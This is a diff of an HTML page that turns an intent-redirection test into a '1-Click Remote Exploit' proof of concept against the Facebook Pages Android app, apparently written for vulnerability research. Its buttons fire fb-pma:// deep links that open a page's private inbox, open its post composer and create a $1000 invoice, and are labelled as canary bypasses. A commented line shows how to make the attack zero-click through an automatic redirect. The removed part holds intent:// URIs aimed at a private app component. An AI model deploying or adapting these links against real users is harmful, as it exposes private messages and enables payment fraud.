@@ -2,28 +2,35 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Intent Redirection Test</title>
+    <title>1-Click Remote Exploit</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; text-align: center; }
+        button { padding: 15px; font-size: 16px; background: #1877f2; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 20px; }
+    </style>
 </head>
 <body>
-    <h2>Testing intent:// redirection</h2>
-    <button onclick="fireIntent1()">Test 1: Basic Intent</button>
-    <button onclick="fireIntent2()">Test 2: Component Intent</button>
-    <div id="log"></div>
+    <h2>Remote Intent Redirection PoC</h2>
+    <p>No malicious app required. Clicking the buttons below will trigger the Android intent directly from the browser.</p>
+
+    <!-- Impact 1: Open Private Inbox -->
+    <button onclick="window.location.href='fb-pma://pages/inbox/1215221834996989'">
+        Bypass Canary (Open Inbox)
+    </button>
+
+    <!-- Impact 2: Open Private Post Composer -->
+    <button onclick="window.location.href='fb-pma://pplus_lar_new_post/?page_id=1215221834996989'">
+        Bypass Canary (New Post)
+    </button>
+    
+    <!-- Impact 3: 1-Click Invoice Forgery -->
+    <button onclick="window.location.href='fb-pma://payments/invoice/create?product_type=physical&seller_id=1215221834996989&buyer_id=1215221834996989&currency_code=USD&source=app&amount=1000'">
+        Open Invoice (Confirm Amount)
+    </button>
 
     <script>
-        function log(msg) { document.getElementById('log').innerHTML += msg + "<br>"; }
-
-        function fireIntent1() {
-            log("Firing intent:// with fbinternal scheme...");
-            // Trying to hit the canary via intent scheme
-            window.location.href = "intent://pma/push_notification_settings#Intent;scheme=fbinternal;package=com.facebook.pages.app;end";
-        }
-
-        function fireIntent2() {
-            log("Firing intent:// direct to component...");
-            // Trying to directly launch a private component from the webview
-            window.location.href = "intent:#Intent;component=com.facebook.pages.app/com.facebook.pages.app.pushnotifications.settings.activity.PagesPushNotificationSettingsActivity;end";
-        }
+        // Optional: You can even make it a Zero-Click exploit by automatically redirecting
+        // uncomment the line below to test 0-click
+        // setTimeout(() => { window.location.href='fb-pma://pages/inbox/1215221834996989'; }, 2000);
     </script>
 </body>
 </html>
